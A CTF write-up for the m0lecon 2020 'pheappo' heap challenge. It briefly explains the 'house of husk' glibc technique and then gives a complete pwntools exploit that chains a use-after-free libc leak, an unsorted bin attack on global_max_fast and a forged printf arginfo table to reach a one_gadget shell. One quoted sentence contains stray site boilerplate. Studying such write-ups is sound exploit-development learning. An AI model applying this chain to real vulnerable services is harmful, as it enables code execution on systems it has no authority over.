---
ctf_name: "m0lecon 2020"
layout: writeup
title:	"pheappo"
date:	2020-11-16
category: "pwn"
author: "NicolaVV"
---

### Chall Description

That was a standard heap pwnable with some restrictions:
- Can alloc only chunks with size in range(1040, 38400), which goes to unsorted bin after free
- UAF possible, but not double free because of some additionals checks enforced with the global array `bitmap`
- Can't overwrite malloc_hook and free_hook

To exploit under those conditions I ended up using this known technique which i didn't know the existence of, [house of husk](https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507), pretty cool exploit chain which make use of a very strange printf functionality. Did you know that...

> The GNU C Library lets you define your own cuNo captcha required for preview. Please, do not write just a link to original writeup here.stom conversion specifiers? 

No? Well neither did I. Find out more about this at [http://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html](http://www.gnu.org/software/libc/manual/html_node/Customizing-Printf.html)

The exploit is mainly an implementation of `house-of-husk` technique so I'm not gonna explain it deeply, since you can find more detailed information in the linked post. I tried to divide the exploit in sections like the post author's did, so it should be easier to follow it. 

Thanks to the organizers for those nice challenges, actually learnt a lot of new stuffs :).

### Exploit

```py
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF("pheappo")
libc = ELF("libc.so.6")

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote("challs.ctf.m0lecon.it", 9001)
    else:
        return process([exe.path] + argv, env={'LD_PRELOAD': "./libc.so.6"}, *a, **kw)

def flush():
    return io.recvuntil(b'Choice: ', drop=True)

def create(sz):
    io.sendline(b'1')
    io.recvuntil(b'Size: ')
    io.sendline(f'{sz}'.encode())
    return flush()

def read(idx):
    io.sendline(b'2')
    io.recvuntil(b'Index: ')
    io.sendline(f'{idx}'.encode())
    leak = io.recvuntil(b'<=== Menu ===>', drop=True)
    flush()
    return leak

def write(idx, data):
    io.sendline(b'3')
    io.recvuntil(b'Index: ')
    io.sendline(f'{idx}'.encode())
    io.recvuntil(b'Data: ')
    io.sendline(data)
    return flush()

def delete(idx):
    io.sendline(b'4')
    io.recvuntil(b'Index: ')
    io.sendline(f'{idx}'.encode())
    return flush()

def quit():
    io.sendline(b'5')


if __name__ == "__main__":       
    io = start()
    
    # 1) Leak libc address
    create(1040) # to leak libc_main_arena with UAF
    '''
    2 chunks to achieve relative a overwrite with free
    more on this tecnique @ https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack/
    - briefly, after setting global_max_fast to a big value, every chunk is gonna be treated as a 
    fastbin chunk, so every free is gonna put the chunk in main_arena.fastbinsY[out_of_bound_idx], achieving
    an out of bound write of a heap pointer in the libc
    E.G)
        - size=1040 + 0x10*i writes to main_arena + 528 + i*8
    '''
    get_i = lambda off_from_arena : (off_from_arena - 528) // 8
    create(1040 + 0x10 * get_i(libc.sym.__printf_arginfo_table - libc.sym.main_arena))
    create(1040 + 0x10 * get_i(libc.sym.__printf_function_table - libc.sym.main_arena))

    delete(0)
    chunk0leak = read(0)
    # leak &main_arena.unsortedbin
    libc_mainarena_unsortedbin = u64(chunk0leak[:8])

    libc.address = libc_mainarena_unsortedbin - 2116768
    log.info(f'libc_base: {libc.address:x}')
    onegadget = libc.address + 0x4f322 - 0x1e7000
    log.info(f'one_gadget: 0x{onegadget:x}')

    # forge fake __printf_arginfo_table so that tbl['%d'] = one_gadget
    fake_tbl = flat({ 
        784 : onegadget, # 0x4f322 0x10a38c
    }, filler=b'\x00')

    # 2) Make global_max_fast large with unsorted bin attack
    global_max_fast = libc.address + 2124096
    log.info('Do unsorted bin attack to overwrite global_max_fast...')
    where = global_max_fast-0x10
    write(0, p64(0) + p64(where))
    create(1040)

    # 3) Write the address of a fake arginfo table to __printf_arginfo_table by "relative overwrite"
    log.info('Write chunk1payload_ptr-0x10 to __printf_arginfo_table...')
    write(1, fake_tbl)
    delete(1)

    # 4) Write a non-null value to __printf_function_table by "relative overwrite"
    log.info('Write chunk2payload_ptr-0x10 to __printf_function_table...')
    delete(2)

    # 5) call printf to call onegadget
    log.success("Get shell")
    quit()

    io.interactive()
```